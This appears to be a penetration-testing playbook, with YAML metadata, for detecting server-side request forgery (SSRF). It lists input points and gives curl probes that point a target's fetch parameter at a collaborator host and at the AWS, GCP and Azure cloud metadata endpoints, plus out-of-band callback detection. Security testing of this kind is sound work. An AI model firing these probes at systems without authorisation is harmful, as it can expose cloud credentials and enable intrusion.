---
id: ssrf-web-001
name: Server-Side Request Forgery (SSRF) Detection
category: penetration-testing
mitre_attack_ids: [TA0001, T1595]
owasp_mapping: [A10, API8]
cwe_ids: [CWE-918]
verification_track: exploit-verified
severity: high
tools: [burp-mcp, curl, caido, zap]
stage: Analysis / Weaponization
tags: [ssrf, server-side, injection, cloud-metadata]
---

## Objective
Detect SSRF vulnerabilities where the application fetches remote resources based on user input without proper validation.

## Steps

### 1. Identify input points
- URL parameters, POST bodies, headers (Referer, X-Forwarded-For), file upload URLs
- Look for features: webhooks, document/image fetching, proxy functionality

### 2. Basic probing
Use `curl` to send requests with modified URL parameters pointing to a controlled endpoint:

```bash
curl -v "https://target.com/fetch?url=http://YOUR-COLLABORATOR-SERVER/probe"
```

### 3. Cloud metadata endpoint testing
Target cloud provider metadata endpoints to confirm SSRF impact:

```bash
# AWS
curl -v "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# GCP
curl -v "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# Azure
curl -v "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### 4. Blind SSRF detection
If no response body is reflected, use an out-of-band (OOB) detection method:
- Deploy an interact.sh or Burp Collaborator endpoint
- Look for DNS/HTTP callbacks in collaborator logs

### 5. Validation
- SSRF is verified if an outbound request is made to a target you control (collaborator)
- Impact is confirmed if cloud metadata is returned in the response
